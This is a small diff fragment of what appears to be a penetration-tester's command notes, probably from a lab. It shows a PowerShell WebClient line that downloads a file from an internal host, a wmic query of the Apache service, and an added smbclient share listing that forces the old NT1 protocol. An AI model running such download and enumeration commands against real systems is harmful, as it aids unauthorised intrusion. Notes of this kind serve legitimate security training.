@@ -20,3 +20,6 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.92
 
 
 wmic service where caption="Apache" get name,startmode
+
+
+smbclient -L //10.11.1.8 --option='client min protocol=NT1'
